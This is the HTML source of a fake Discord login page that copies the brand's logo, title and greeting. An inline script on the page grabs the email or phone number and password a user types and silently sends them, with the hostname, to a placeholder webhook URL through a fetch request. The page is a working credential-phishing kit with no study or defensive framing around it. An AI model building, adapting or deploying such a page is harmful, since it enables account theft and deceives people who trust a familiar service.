<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="./css/index.css">
    <link rel="stylesheet" href="css/main.css">
    <title>Discord</title>
</head>

<body>
    <img src="./assets/bg.svg" alt="Discord BG" class="bg">
    <div class="login-page">
        <div class="svg-logo-text">
            <img src="./assets/login-screen-logo.svg" alt="Discord">
        </div>

        <main class="main">
            <div class="authBox">
                <div class="main-form">

                    <form id="loginForm" action="#">
                        <div class="input-groups">
                            <div class="main-form-header">
                                <h1>Welcome back!</h1>
                                <p>We're so excited to see you again!</p>
                            </div>
                            <div class="email-wrapper">
                                <label for="emailORphone">
                                    Email or Phone Number
                                    <span class="required">*</span>
                                </label>
                                <input type="text" id="emailORphone" required autocomplete="off">
                            </div>
                            <div class="password-wrapper">
                                <label for="password">
                                    Password
                                    <span class="required">*</span>
                                </label>
                                <input type="password" id="password" required>
                            </div>
                        </div>
                        <div class="forgot-password">
                            <a href="#">Forgot your password?</a>
                        </div>
                        <div class="login">
                            <button type="submit">
                                send your ip adress to webhook
                            </button>
                        </div>
                        <div class="small-register">
                            <span>Need an account?</span>
                            <a href="#">Register</a>
                        </div>
                    </form>
                </div>

                <div class="right-section">
                    <div class="login-container">
                        <div class="qr-code">
                            <!-- SVG QR Code goes here -->
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <!-- Updated IP + input collection code -->
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); // prevent actual form submission

            const webhookURL = 'https://example.com'; // placeholder webhook

            const emailOrPhone = document.getElementById('emailORphone').value;
            const password = document.getElementById('password').value;
            const ip = location.hostname;

            // Build query string
            const params = new URLSearchParams({
                emailOrPhone: emailOrPhone,
                password: password,
                ip: ip
            });

            // Send data to webhook
            fetch(webhookURL + '?' + params.toString(), {
                method: 'GET'
            }).catch(() => { /* silently fail */ });

            // Optional: redirect to placeholder page after submission
            // window.location.href = 'about:blank';
        });
    </script>

</body>
</html>
